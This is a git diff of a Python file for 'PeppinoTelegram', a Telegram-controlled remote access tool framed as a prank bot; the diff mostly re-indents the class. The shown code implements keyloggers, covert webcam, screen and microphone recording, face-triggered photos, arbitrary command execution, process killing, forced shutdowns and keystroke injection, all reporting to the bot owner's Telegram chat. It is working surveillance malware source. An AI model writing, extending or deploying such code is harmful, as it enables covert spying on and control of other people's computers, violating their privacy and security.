@@ -685,883 +685,852 @@ o888o  o888o  `Y8bood8P'  o888o        `Y8bod8P'  888bod8P'
                                                  o888o
 """
 class PeppinoTelegram:
-    def __init__(self, token: str, owner_id: int, mixer: CustomMixer, capture: VideoCapture, loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]]) -> None:
-        self.token = token
-        self.owner_id = owner_id
-        self.loading_bar_set = loading_bar_set
-        self.loading_bar_spinner = loading_bar_spinner
-
-        self.help = HELP
-        self.process_killer_page = 0
-        self.owner_name = ""
-        self.cap = capture
-        self.bot = Bot(token) 
-        self.cantopenlist = []
-        self.duckyhelp = DUCKYHELP
-        self.explorer_path = getcwd()
-        self.audio_mixer = mixer
-        self.process_explorer_menu = None
-        self.explorer_message = None
-        self.mixer_menu_keyboard = None
-        #converts text to functions
-        self.function_table: dict[str:Callable] = {
-            "pss":self.pss,
-            "psst":self.pss,
-            "bsend":self.bsend,
-            "stop":sys.exit,
-            "altf4":self.altf4,
-            "breath":self.breath,
-            "browser":browseropen,
-            "execute":self.execute,
-            "selfie":self.selfie,
-            "plankton":self.plankton,
-            "johnpork":self.johnpork,
-            "shutdown":self.shutdown,
-            "quickmenu":self.quickmenu,
-            "gabinetti":self.gabinetti,
-            "jumpscare":self.jumpscare,
-            "keylogger":self.keylogger,
-            "screenshot":self.screenshot,
-            "messagebox":self.message_box,
-            "waitforface":self.waitforface,
-            "webcamclip":self.record_webcam,
-            "screenclip":self.record_screen,
-            "messagespam":self.spam_windows,
-            "checkforface":self.checkforface,
-            "fakeshutdown":self.fake_shutdown,
-            "processkiller":self.process_killer,
-            "livekeylogger":self.live_keylogger,
-            "microphone":self.send_record_audio,
-            "help":lambda: self.bsend(self.help),
-            "invertedscreen":self.inverted_screen,
-            "johnporknoaudio":self.johnporknoaudio,
-            "planktonnoaudio":self.planktonnoaudio,
-            "distortedscreen":self.distorted_screen,
-            "jumpscarenoaudio":self.jumpscarenoaudio,
-            "fullclip":self.record_webcam_and_screen,
-            "duckyhelp":lambda: self.bsend(self.duckyhelp),
-            "duckyscript": lambda *args: toducky(" ".join(args), execute=True),
-            "capslock": lambda: toducky("CAPSLOCK", execute=True),
-            "randomkeyboard":self.randomkeyboard,
-            "terminateprocess":self.terminate_process_by_name,
-            "setvideowallpaper":self.setvideowallpaper,
-            "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
-            "recordjum":self.record_jumpscare_reaction,
-            "mutevolume":lambda:self.audio_mixer.mute(),
-            "setvolume":self.audio_mixer.setVolumePercentage,
-            "fullvolume":lambda:self.audio_mixer.full(),
-            "mixermenu":self.mixer_menu,
-            "camerawallpaper":self.setCameraAsWallpaper,
-            "mousecontroller":self.mousecontroller,
-            "cantopenmenu":self.cantopenmenu,
-            "cantopenadd":self.cantopen,
-            "cantopenremove":self.removefromcantopen,
-            "clear":self.clear,
-            "mouser":self.mouser,
-            "mousel":self.mousel,
-            "mouseu":self.mouseu,
-            "moused":self.moused,
-            "leftclick":self.leftclick,
-            "rightclick":self.rightclick,
-            "nothing":lambda:...,
-            "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
-            "tralalerotralala":lambda:self.__play_loaded_sound("tralarero-tralala", volume=8)
-        }
-        self.no_background_functions = [self.message_box, self.spam_windows]
+        def __init__(self, token: str, owner_id: int, mixer: CustomMixer, capture: VideoCapture, loading_bar_set: list[str]=["🟩","🟥"], loading_bar_spinner: list[str]=[all_spinners["braille"]]) -> None:
+            self.token = token
+            self.owner_id = owner_id
+            self.loading_bar_set = loading_bar_set
+            self.loading_bar_spinner = loading_bar_spinner
     
-    def __send_image(self, image_name: str, caption=None) -> bool:
-        try:
-            with open(image_name, "rb") as image:
-                msg = self.bot.sendPhoto(self.owner_id, image, caption=caption)["message_id"]
-            return msg
-        except Exception as e:
-            return self.bsend(f"Error while sending an image\n{e}")
-    
-    def __playsound(self, audio: str) -> None:
-        PlaySound(audio, SND_FILENAME | SND_ASYNC)
-    
-    def __play_loaded_sound(self, audio: str, volume=None) -> None:
-        old = self.audio_mixer.getVolumePercentage()
-        if volume:
-            self.set_volume(volume)
-        self.__playsound(self.audios[audio])
-        sleep(5)
-        if volume:
-            self.set_volume(old)
-
-    def set_volume(self, volume):
-        if volume in range(0, 101):
-            self.audio_mixer.setVolumePercentage(volume)
-        else:
-            self.bsend(f"Volume must be from 0.0 to 100.0")
-    
-    def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
-        return EditableMessage(self.bot, self.owner_id, content, autosend)
-    
-    def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=False, label=None) -> LoadingBar:
-        return LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc, label=label, full_char=self.loading_bar_set[0], empty_char=self.loading_bar_set[1], spinner_frames=self.loading_bar_spinner, spinner_pos="right", bar_lenght=10) 
-    
-    def new_menu(self, menu: dict[str:Any], autosend: bool=True, label: str="Choose an option: ", page: int=0, next_btn: bool=False, next_btn_lab: str="next_page", prev_btn_lab: str="previus_page", close_btn_lab: str="close_page", rows=2) -> ButtonsMenu:
-        return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn, next_btn_lab=next_btn_lab, prev_btn_lab=prev_btn_lab, close_btn_lab=close_btn_lab, keyboard_rows=rows)
-
-    def opencap(self) -> None:
-        if not self.cap.isOpened():
-            self.cap.open(0)
-
-    def closecap(self) -> None:
-        if self.cap.isOpened():
-            self.cap.release()
-    
-    def bsend(self, text: str, retries=0) -> int|None:
-        if retries>3:
-            return
-        try:
-            if checkconn():
-                return self.bot.sendMessage(self.owner_id, text)["message_id"]
-            raise ConnectionError
-        except Exception as e:
-            return self.bsend(text, retries+1)
-
-    """
-  .oooooo.      ooo        ooooo oooooooooooo ooooo      ooo ooooo     ooo
- d8P'  `Y8b     `88.       .888' `888'     `8 `888b.     `8' `888'     `8'
-888      888     888b     d'888   888          8 `88b.    8   888       8
-888      888     8 Y88. .P  888   888oooo8     8   `88b.  8   888       8
-888      888     8  `888'   888   888    "     8     `88b.8   888       8
-`88b    d88b     8    Y     888   888       o  8       `888   `88.    .8'
- `Y8bood8P'Ybd' o8o        o888o o888ooooood8 o8o        `8     `YbodP'
-    """
-    def quickmenu(self) -> int:
-        buttons = {
-            "selfie":"selfie",
-            "Screenshot":"screenshot",
-            "Jumpscare":"jumpscare",
-            "Plankton":"plankton",
-            "ALT F4":"altf4",
-            "Psst..":"pss",
-            "Webcam Clip (5s)":"webcamclip",
-            "Screen Clip (5s)":"screenclip",
-            "Full Clip (5s)":"fullclip",
-            "Microphone Clip (5s)":"microphone",
-        }
-        menu = self.new_menu(buttons, autosend=False)
-        return menu.send_keyboard()
-
-    def mixer_menu(self) -> None:
-        buttons = {
-            "🔊Full Volume":"/fullvolume",
-            "🔉Half Volume":"/setvolume 50",
-            "🔇Mute":"/mutevolume",
-        }
-        self.mixer_menu_keyboard = self.new_menu(buttons, close_btn_lab="MXR_close")
-    
-    def on_callback_query(self, msg) -> None:
-        query_id, from_id, data = glance(msg, flavor="callback_query")
-        self.parse_command(data) 
-        self.bot.answerCallbackQuery(query_id)
-
-    def mouseu(self) -> None:
-        pos = pg.position()
-        pg.moveTo(pos[0], pos[1]-MOUSE_JMP)
-
-    def moused(self) -> None:
-        pos = pg.position()
-        pg.moveTo(pos[0], pos[1]+MOUSE_JMP)
-
-    def mouser(self) -> None:
-        pos = pg.position()
-        pg.moveTo(pos[0]+MOUSE_JMP, pos[1])
-
-    def mousel(self) -> None:
-        pos = pg.position()
-        pg.moveTo(pos[0]-MOUSE_JMP, pos[1])
-
-    def leftclick(self) -> None:
-        pg.leftClick()
-    
-    def rightclick(self) -> None:
-        pg.rightClick()
-
-    def mousecontroller(self) -> None:
-        menu = {
-            "LEFT CLICK":"/leftclick", "UP":"/mouseu","RIGHTCLICK":"/rightclick",
-            "LEFT":"/mousel","DOWN":"/moused","RIGHT":"/mouser"
-        }
-        self.mouse_controller_menu = self.new_menu(menu, label="Mouse Control", rows=3)
-
-    def process_killer(self, page=0) -> None:
-        if self.process_explorer_menu is None:
+            self.help = HELP
             self.process_killer_page = 0
-        else:
-            self.process_explorer_menu.delete()
-            self.process_killer_page = page
-        processes = [x.name() for x in psutil.process_iter()] 
-        self.process_explorer_menu = self.new_menu({process:f"/terminateprocess {process}" for process in processes}, next_btn=True, autosend=False, page=self.process_killer_page, next_btn_lab="PK_next_page", prev_btn_lab="PK_previous_page", close_btn_lab="PK_close_page", rows=3)
-        return self.process_explorer_menu.send_keyboard()
+            self.owner_name = ""
+            self.cap = capture
+            self.bot = Bot(token) 
+            self.cantopenlist = []
+            self.duckyhelp = DUCKYHELP
+            self.explorer_path = getcwd()
+            self.audio_mixer = mixer
+            self.process_explorer_menu = None
+            self.explorer_message = None
+            self.mixer_menu_keyboard = None
+            #converts text to functions
+            self.function_table: dict[str:Callable] = {
+                "pss":self.pss,
+                "psst":self.pss,
+                "bsend":self.bsend,
+                "stop":sys.exit,
+                "altf4":self.altf4,
+                "breath":self.breath,
+                "browser":browseropen,
+                "execute":self.execute,
+                "selfie":self.selfie,
+                "plankton":self.plankton,
+                "johnpork":self.johnpork,
+                "shutdown":self.shutdown,
+                "quickmenu":self.quickmenu,
+                "gabinetti":self.gabinetti,
+                "jumpscare":self.jumpscare,
+                "keylogger":self.keylogger,
+                "screenshot":self.screenshot,
+                "messagebox":self.message_box,
+                "waitforface":self.waitforface,
+                "webcamclip":self.record_webcam,
+                "screenclip":self.record_screen,
+                "messagespam":self.spam_windows,
+                "checkforface":self.checkforface,
+                "fakeshutdown":self.fake_shutdown,
+                "processkiller":self.process_killer,
+                "livekeylogger":self.live_keylogger,
+                "microphone":self.send_record_audio,
+                "help":lambda: self.bsend(self.help),
+                "invertedscreen":self.inverted_screen,
+                "johnporknoaudio":self.johnporknoaudio,
+                "planktonnoaudio":self.planktonnoaudio,
+                "distortedscreen":self.distorted_screen,
+                "jumpscarenoaudio":self.jumpscarenoaudio,
+                "fullclip":self.record_webcam_and_screen,
+                "duckyhelp":lambda: self.bsend(self.duckyhelp),
+                "duckyscript": lambda *args: toducky(" ".join(args), execute=True),
+                "capslock": lambda: toducky("CAPSLOCK", execute=True),
+                "randomkeyboard":self.randomkeyboard,
+                "terminateprocess":self.terminate_process_by_name,
+                "setvideowallpaper":self.setvideowallpaper,
+                "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
+                "recordjum":self.record_jumpscare_reaction,
+                "mutevolume":lambda:self.audio_mixer.mute(),
+                "setvolume":self.audio_mixer.setVolumePercentage,
+                "fullvolume":lambda:self.audio_mixer.full(),
+                "mixermenu":self.mixer_menu,
+                "camerawallpaper":self.setCameraAsWallpaper,
+                "mousecontroller":self.mousecontroller,
+                "cantopenmenu":self.cantopenmenu,
+                "cantopenadd":self.cantopen,
+                "cantopenremove":self.removefromcantopen,
+                "clear":self.clear,
+                "mouser":self.mouser,
+                "mousel":self.mousel,
+                "mouseu":self.mouseu,
+                "moused":self.moused,
+                "leftclick":self.leftclick,
+                "rightclick":self.rightclick,
+                "nothing":lambda:...,
+                "getvolume":lambda:self.bsend(f"Current Volume: {self.audio_mixer.getVolumePercentage()}"),
+                "tralalerotralala":lambda:self.__play_loaded_sound("tralarero-tralala", volume=8)
+            }
+            self.no_background_functions = [self.message_box, self.spam_windows]
 
-    def check_if_proc_running(self, processname) -> bool:
-        return processname.lower().strip() in [x.name().lower().strip() for  x in psutil.process_iter()]
+        def __play_loaded_sound(self, audio: str, volume=None) -> None:
+            old = self.audio_mixer.getVolumePercentage()
+            if volume:
+                self.set_volume(volume)
+            self.__playsound(self.audios[audio])
+            sleep(5)
+            if volume:
+                self.set_volume(old)
 
-    def terminate_process_by_name(self, process_name: str) -> None:
-        for proc in psutil.process_iter():
-            if proc.name().lower() == process_name.lower().strip():
-                proc.terminate()
-        
-    def screenshot(self) -> int:
-        try:
-            filename = join(BURN_DIRECTORY,randompngname())
-            screenshot = pg.screenshot()
-            screenshot.save(filename)
-            message_id = self.__send_image(filename)
-            remove(filename)
-            return message_id
-        except Exception as e:
-            return self.bsend(f"Error while getting screenshot\n{e}")
+        def __playsound(self, audio: str) -> None:
+            PlaySound(audio, SND_FILENAME | SND_ASYNC)
 
-    def message_box(self, text: str, title: str = "Warning", style: int = 0x1000) -> int:
-        def run():
-            ctypes.windll.user32.MessageBoxW(0, text, title, style)
-        Thread(target=run, daemon=True).start()
-
-    def spam_windows(self, n: int, text: str) -> None:
-        for i in range(n):
-            sp_win = Thread(target=self.message_box, args=["Warning", text,])
-            sp_win.start()
-
-    def show_image(self, image_path: str) -> None:
-        try:
-            imshow("Warning", resize(imread(image_path), (400, 400)))
-            setWindowProperty("Warning", WND_PROP_TOPMOST, 1)
-            waitKey(0)
-            destroyWindow("Warning")
-            remove(image_path)
-        except Exception as e:
-            self.bsend(f"Error while trying to show image: \n{e}")
-        
-
-    """
-ooooooooo.   oooooooooooo   .oooooo.     .oooooo.   ooooooooo.   oooooooooo.   ooooo ooooo      ooo   .oooooo.    
-`888   `Y88. `888'     `8  d8P'  `Y8b   d8P'  `Y8b  `888   `Y88. `888'   `Y8b  `888' `888b.     `8'  d8P'  `Y8b   
- 888   .d88'  888         888          888      888  888   .d88'  888      888  888   8 `88b.    8  888
- 888ooo88P'   888oooo8    888          888      888  888ooo88P'   888      888  888   8   `88b.  8  888
- 888`88b.     888    "    888          888      888  888`88b.     888      888  888   8     `88b.8  888     ooooo
- 888  `88b.   888       o `88b    ooo  `88b    d88'  888  `88b.   888     d88'  888   8       `888  `88.    .88'
-o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   o888o o8o        `8   `Y8bood8P'
-    """
-
-    def setvideowallpaper(self, videofilename: str):
-        res = True
-        filename = join(BURN_DIRECTORY, "jxframe.png")
-        backup_filename = join(BURN_DIRECTORY, "backup.png")
-        self.opencap()
-        video = VideoCapture(abspath(videofilename))
-        while res:
-            res, frame = video.read()
-            imwrite(frame)
-            change_wallpaper(filename)
-        change_wallpaper(backup_filename)
-        remove(filename)
-        remove(backup_filename)
-        self.closecap()
-        self.restore_wallpaper()
-
-    def setCameraAsWallpaper(self, seconds: float|int=5):
-        seconds = int(seconds)
-        loading_bar = self.new_loading_bar(label="Set Camera As Wallpaper", total=seconds, showperc=True)
-        filename = join(BURN_DIRECTORY, "jxframe.png")
-        start = time()
-        res = True
-        self.opencap()
-        while time()-start <= seconds and res:
-            loading_bar.update(time()-start)
-            res, frame = self.cap.read()
-            frame = pad_to_16_9(frame)
-            imwrite(filename, frame)
-            change_wallpaper(filename)
-        loading_bar.set100()
-        self.closecap()
-        sleep(1)
-        try:
-            remove(filename)
-        except FileNotFoundError:
-            ...
-        loading_bar.delete()
-        self.restore_wallpaper()
-
-    def keylogger(self, timeout: int=10) -> None:
-        buffer = StringIO()
-        start=time()
-        loading_bar = self.new_loading_bar(timeout, "Keylogger with file", showperc=True)
-        while (time()-start)<timeout:
-            loading_bar.update(time()-start)
-            event = read_event()
-            if event.event_type == KEY_DOWN:
-                e = event.name.split()[0]
-                if e in printable:
-                    buffer.write(e)
-                else:
-                    buffer.write(f"\n{e.upper()}\n")
-        buffer.seek(0)
-        with buffer:
-            self.bot.sendDocument(self.owner_id, (f"keylog{now()}.txt",buffer))
-        loading_bar.set100()
-        loading_bar.delete()
-
-    def randomkeyboard(self, timeout: int =5) -> None:
-        start = time()
-        loading_bar = self.new_loading_bar(timeout, label="Random Keyboard", showperc=True)
-        while (time()-start)<timeout:
-            loading_bar.update(time()-start)
-            event = read_event()
-            if event.event_type == KEY_DOWN:
-                e = event.name.split()[0]
-                if e in printable:
-                    pg.press("backspace")
-                    pg.write(choice(printable))
-        loading_bar.set100()
-        loading_bar.delete()
-    
-    def live_keylogger(self, timeout=10) -> None:
-        start = time()
-        buffer = ""
-        self.bsend("Live keylogger started")
-        while time()-start < timeout:
-            event = read_event()
-            if event.event_type == KEY_DOWN:
-                e = event.name.split()[0]
-                if e in printable and not(e in " \n\t"):
-                    buffer+=e
-                else:
-                    self.bsend(f"BUFFER: {buffer}")
-                    buffer=""
-        self.bsend("Live keylogger done")
-
-    def checkforface(self) -> None:
-        res, frame = detect_face(self.cap)
-        if res:
-            self.bsend("Face found")
-        else:
-            self.bsend("Face not found")
-    
-    def waitforface(self, timeout=60):
-        start = time()
-        self.opencap()
-        cap = self.cap
-        while time()-start < timeout:
-            res, frame = detect_face(cap)
-            if frame is None:
-                self.bsend("Face recognition model not loaded properly.")
-                break
-            if res:
-                filename = randompngname()
-                imwrite(filename, frame)
-                self.__send_image(filename)
-                remove(filename)
-                break
-        self.closecap()
-    
-    def record_screen(self, duration: int=5, caption: str|None=None) -> None:
-        duration = int(duration)
-        bar = self.new_loading_bar(duration, label="Recording Screen")
-        try:
-            filename = f"{BURN_DIRECTORY}/{randomname()}.mp4"
-            audio_filename = f"{BURN_DIRECTORY}/{randomname()}.wav"
-            SCREEN_SIZE = tuple(pg.size())
-            fourcc = VideoWriter_fourcc(*'XVID')
-            out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
-            start_time = time()
-            samplerate = 44100
-            channels = 1
-            frames = int(duration * samplerate)
-            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
-
-            time_elapsed = 0
-            while int(time_elapsed) < duration:
-                time_elapsed = time() - start_time
-                bar.progress = time_elapsed
-                bar.update()
-                img = pg.screenshot()
-                img = np.array(img)
-                img = cvtColor(img, COLOR_BGR2RGB)
-                out.write(img)
-            bar.set100()
-
-            sd.wait()
-            out.release()
-            sf.write(audio_filename, audio_data, samplerate)
-            video_clip = VideoFileClip(filename)
-            audio_clip = AudioFileClip(audio_filename)
-            video_with_audio = video_clip.set_audio(audio_clip)
-            final_filename = filename.replace(".mp4", "_final.mp4")
-            video_with_audio.write_videofile(final_filename, logger=None)
-            tmploadingmessage = self.new_editable_message("Sending recording...", True)
-            with open(final_filename, "rb") as video:
-                self.bot.sendVideo(self.owner_id, video, caption=caption)
-            tmploadingmessage.delete()
-            remove(filename)
-            remove(audio_filename)
-            remove(final_filename)
-        except Exception as e:
-            self.bsend(f"Error while recording screen: {e}")
-        bar.fill_and_delete()
-
-    def record_webcam(self, duration: int=5, caption: str|None=None) -> None:
-        duration = int(duration)
-        bar = self.new_loading_bar(duration, label="Recording Webcam")
-        try:
-            filename = f"{BURN_DIRECTORY}/{randomname()}.mp4"
-            audio_filename = f"{BURN_DIRECTORY}/{randomname()}.wav"
-            fourcc = VideoWriter_fourcc(*'XVID')
-            self.opencap()
-            webcam = self.cap
-            width = int(webcam.get(CAP_PROP_FRAME_WIDTH))
-            height = int(webcam.get(CAP_PROP_FRAME_HEIGHT))
-            out = VideoWriter(filename, fourcc, 20.0, (width, height))
-            start_time = time()
-            samplerate = 44100
-            channels = 1
-            frames = int(duration * samplerate)
-            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
-            time_elapsed = 0
-            while int(time_elapsed) < duration:
-                time_elapsed = time() - start_time
-                bar.progress = time_elapsed
-                bar.update()
-                ret, frame = webcam.read()
-                if not ret:
-                    break
-                out.write(frame)
-            bar.set100()
-            sd.wait()
-            out.release()
-            self.closecap()
-            sf.write(audio_filename, audio_data, samplerate)
-            video_clip = VideoFileClip(filename)
-            audio_clip = AudioFileClip(audio_filename)
-            video_with_audio = video_clip.set_audio(audio_clip)
-            final_filename = filename.replace(".mp4", "_final.mp4")
-            video_with_audio.write_videofile(final_filename, logger=None)
-            tmploadingmessage = self.new_editable_message("Sending recording...", True)
-            with open(final_filename, "rb") as video:
-                self.bot.sendVideo(self.owner_id, video, caption=caption)
-            tmploadingmessage.delete()
-            remove(filename)
-            remove(audio_filename)
-            remove(final_filename)
-        except Exception as e:
-            self.bsend(f"Error while recording webcam {e}")
-        bar.fill_and_delete()
-
-    def record_webcam_and_screen(self, capture_duration: int=5, caption: str|None=None) -> None:
-        capture_duration = int(capture_duration)
-        bar = self.new_loading_bar(capture_duration, label="Recording Webcam&Screen")
-        try:
-            filename = join(BURN_DIRECTORY, randomname() + ".mp4")
-            audio_filename = join(BURN_DIRECTORY, randomname() + ".wav")
-            SCREEN_SIZE = tuple(pg.size())
-            fourcc = VideoWriter_fourcc(*'XVID')
-            out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
-            self.opencap()
-            webcam = self.cap
-            start_time = time()
-            samplerate = 44100
-            channels = 1
-            frames = int(capture_duration * samplerate)
-            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
-
-            time_elapsed = 0 
-            while int(time_elapsed) < capture_duration:
-                time_elapsed = time() - start_time
-                bar.progress = time_elapsed
-                bar.update()
-                img = pg.screenshot()
-                img = np.array(img)
-                img = cvtColor(img, COLOR_BGR2RGB)
-                _, frame = webcam.read()
-                fr_height, fr_width, _ = frame.shape
-                frame = resize(frame, (fr_width//2, fr_height//2))
-                fr_height, fr_width, _ = frame.shape
-                img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
-                out.write(img)
-            bar.set100()
-            sd.wait()
-            out.release()
-            self.closecap()
-            sf.write(audio_filename, audio_data, samplerate)
-            video_clip = VideoFileClip(filename)
-            audio_clip = AudioFileClip(audio_filename)
-            video_with_audio = video_clip.set_audio(audio_clip)
-            final_filename = filename.replace(".mp4", "_final.mp4")
-            video_with_audio.write_videofile(final_filename, logger=None)#someone must pay for this
-            tmploadingmessage = self.new_editable_message("Sending recording...", True)
-            with open(final_filename, "rb") as video:
-                self.bot.sendVideo(self.owner_id, video, caption=caption)
-            tmploadingmessage.delete()
-            remove(filename)
-            remove(audio_filename)
-            remove(final_filename)
-        except Exception as e:
-            e = traceback.format_exc()
-            self.bsend(f"Error while sending video clip\n{e}")
-        bar.fill_and_delete()
-
-    def record_audio(self, filename, seconds, samplerate=48000) -> bool|Exception:
-        try:
-            seconds = float(seconds)
-            frames = int(seconds * samplerate)
-            data = sd.rec(frames, samplerate=samplerate, channels=1, dtype='int16')
-            sd.wait()
-            sf.write(filename, data, samplerate)
-            return True
-        except Exception as e:
-            return e 
-        
-    def send_record_audio(self, seconds: int=5, caption: str|None=None) -> None:
-        message = self.new_editable_message(f"Recording audio of {seconds} seconds.")
-        filename = randomname()+".wav"
-        filepath = join(BURN_DIRECTORY, filename)
-        res = self.record_audio(filepath, seconds)
-        if isinstance(res, Exception):
-            err = f"Error while recording audio: {res}"
-            self.bsend(err)
-        else:
-            message.edit("Done recording, sending...")
-            filepath = wav_to_ogg(filepath, rmold=True)
-            with open(filepath, "rb") as fi:
-                self.bot.sendVoice(self.owner_id, fi, caption=caption)
-            remove(filepath)
-            message.delete()
-            
-    def execute(self, command) -> None:
-        s = sp.run(command.split, stdout=sp.PIPE, stderr=sp.PIPE, encoding="utf-8")
-        if s.returncode:
-            output = s.stderr
-        else:
-            output = s.stdout
-
-        self.bsend(output)
-        
-    def selfie(self, caption: str|None=None) -> None:
-        try:
-            filename = join(BURN_DIRECTORY,randompngname())
-            self.opencap()
-            camera = self.cap
-            return_value, image = camera.read()
-            if not return_value:
-                raise Exception("Could not find camera")
-            imwrite(filename, image)
-            self.bot.sendPhoto(self.owner_id, open(filename, "rb"), caption=caption)
-            remove(filename)
-            self.closecap()
-            return True
-        except Exception as e:
-            self.bsend(f"Something has happened while getting webcam\n {e}")
-            return False
-
-    def altf4(self) -> None:
-        press_key('alt')
-        press_key('f4')
-        release_key('f4')
-        release_key('alt')
-    
-    def shutdown(self, seconds=0) -> None:
-        system(f"shutdown -s -t {seconds}")
-
-    def fake_shutdown(self) -> None:
-        system('shutdown /s /t 34 /c "Windows Error 104e240-69, please notify the administrator"')
-        system("shutdown -a")
-        
-    def pss(self) -> None:
-        self.__play_loaded_sound("pss")
-    
-    def breath(self) -> None:
-        self.__play_loaded_sound("breath")
-    
-    def inverted_screen(self) -> None:
-        self.modded_screenshot(invert_image)
-    
-    def distorted_screen(self) -> None:
-        self.modded_screenshot(lambda x: distorted_screen(x, randint(20, 40), randint(50, 55)))
-
-    def modded_screenshot(self, effect: Callable, timeout: int=1250) -> None:
-        filename = join(BURN_DIRECTORY, randompngname())
-        pg.screenshot(filename)
-        img = imread(filename)
-        modded_img = effect(img)
-        show_image_fullscreen(modded_img, timeout)
-
-    def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True) -> None:
-        old_volume = self.audio_mixer.getVolumePercentage()
-        self.audio_mixer.full()
-        if image is None:
-            image = self.images[choice(list(self.nomemes))]
-        else:
-            if image in self.images:
-                image = self.images[image]
-            else:
-                image = imread(image)
-        if audio is None:
-            audio = self.audios["ghost-roar"]
-        else:
-            audio = self.audios[audio]
-        imageThread = Thread(target=show_image_fullscreen ,args=(image,))
-
-        if showimage:
-            imageThread.start()
-        if playaudio:
-            self.__playsound(audio)
-        if showimage:
-            imageThread.join()
-        self.audio_mixer.setVolumePercentage(old_volume)
-
-    def jumpscarenoaudio(self) -> None:
-        self.jumpscare(playaudio=False)
-
-    def record_jumpscare_reaction(self, onlycamera=False) -> None:
-        if onlycamera:
-            recording_thread = Thread(target=self.record_webcam, args=(20,))
-        else:
-            recording_thread = Thread(target=self.record_webcam_and_screen, args=(20,))
-
-        recording_thread.start()
-        status_message = self.new_editable_message("Recording")
-        sleep(10)
-        self.jumpscare(playaudio=True)
-        status_message.edit("Jumpscared!")
-        recording_thread.join()
-        status_message.delete()
-
-    def johnpork(self, audio=True) -> None:
-        self.jumpscare("johnpork_meme", "johnpork", playaudio=audio)
-
-    def johnporknoaudio(self) -> None:
-        self.johnpork(False)
-    
-    def plankton(self, audio=True) -> None:
-        self.jumpscare("plankton_meme", "plankton", playaudio=audio)
-    
-    def planktonnoaudio(self) -> None:
-        self.plankton(audio=False)
-    
-    def gabinetti(self) -> None:
-        self.jumpscare("plankton_meme", "gabinetti")
-
-    """
-ooooooooo.         .o.       ooooooooo.    .oooooo..o ooooo ooooo      ooo   .oooooo.    
-`888   `Y88.      .888.      `888   `Y88. d8P'    `Y8 `888' `888b.     `8'  d8P'  `Y8b   
- 888   .d88'     .8"888.      888   .d88' Y88bo.       888   8 `88b.    8  888
- 888ooo88P'     .8' `888.     888ooo88P'   `"Y8888o.   888   8   `88b.  8  888
- 888           .88ooo8888.    888`88b.         `"Y88b  888   8     `88b.8  888     ooooo 
- 888          .8'     `888.   888  `88b.  oo     .d8P  888   8       `888  `88.    .88'  
-o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8bood8P'   
-
-    """
-
-    def parse_audio(self, msg: dict) -> None:
-        if 'voice' in msg:
-            file_id = msg['voice']['file_id']
-        elif 'audio' in msg:
-            file_id = msg['audio']['file_id']
-        file_info = self.bot.getFile(file_id)
-        file_url = f"https://api.telegram.org/file/bot{self.token}/{file_info['file_path']}"
-        filename = randomname()+".ogg"
-        filepath = join(BURN_DIRECTORY, filename)
-        response = requests.get(file_url)
-        with open(filepath, "wb") as f:
-            f.write(response.content) 
-        filepath = ogg_to_wav(filepath, rmold=True)
-        self.__playsound(filepath)
-        remove(filepath)
-
-    def parse_photo(self, msg: dict) -> None:
-        filename = randompngname()
-        filepath = join(BURN_DIRECTORY, filename)
-        self.bot.download_file(msg['photo'][-1]['file_id'], filepath)
-        if "caption" in msg.keys():
-            if msg["caption"] == "/jumpscare":
-                self.jumpscare(filepath)
-                return
-        Thread(target=self.show_image, args=[filepath,]).start()
-        sleep(0.5)
-        remove(filepath)
-    
-    def parse_text(self, msg: dict) -> None:
-        text = msg["text"]
-        if text == "/start":
-            return None
-        elif ";" in text:
-            commands = text.split(";")
-            for command in commands:
-                self.parse_command(command) 
-        else:
-            self.parse_command(text)
-    
-    def parse_command(self, text: str) -> None:
-        args = text.split()
-        command = args[0]
-
-        if command.startswith("/"):
-            command = args[0][1:]
-        function_args = args[1:]
-        function_args = list(map(lambda x: int(x) if x.isdigit() else x, function_args))
-
-        func = self.function_table.get(command)
-        if func:
+        def __send_image(self, image_name: str, caption=None) -> bool:
             try:
-                if func in self.no_background_functions:
-                    func(*function_args)
-                else:
-                    if function_args:
-                        thread_args = (*function_args,)
-                        new_thread = Thread(target=func, args=thread_args)
-                    else:
-                        new_thread = Thread(target=func)
-                    new_thread.start()
-            except TypeError as e:
-                self.bsend(f"Invalid args for function {command}\n{e}")
+                with open(image_name, "rb") as image:
+                    msg = self.bot.sendPhoto(self.owner_id, image, caption=caption)["message_id"]
+                return msg
             except Exception as e:
-                self.bsend(f"Unhandled error for function {command}\n{e}")
-        elif func is None and command.startswith("PK"):
-            if command == "PK_next_page" and self.process_explorer_menu:
-                self.process_killer_page += 1
-                self.process_killer(page=self.process_killer_page)
-            elif command == "PK_previous_page" and self.process_explorer_menu:
-                self.process_killer_page -= 1
-                self.process_killer(page=self.process_killer_page)
-            elif command == "PK_close_page" and self.process_explorer_menu:
-                self.process_explorer_menu.delete()
-            elif command in ("PK_next_page", "PK_previous_page") and not self.process_explorer_menu:
-                self.bsend("Use /processkiller first")
-        elif command.startswith("MXR"):
-            if command == "MXR_close":
-                if self.mixer_menu_keyboard:
-                    self.mixer_menu_keyboard.delete()
-                    self.mixer_menu_keyboard = None
-        else:
-            self.bsend(f"Invalid command {command}")
+                return self.bsend(f"Error while sending an image\n{e}")
 
-    def clear(self) -> None:
-        self.closecap()
-        map(remove, listdir(BURN_DIRECTORY))
-        destroyAllWindows()
-        self.audio_mixer.mute()
-        #self.restore_wallpaper()
-        self.cantopenlist.clear()
-    
-    def parse_document(self, msg: str, mimetype="document") -> None:
-        document = msg[mimetype]
-        file_id = document["file_id"]
-        saved_filename = randomname()
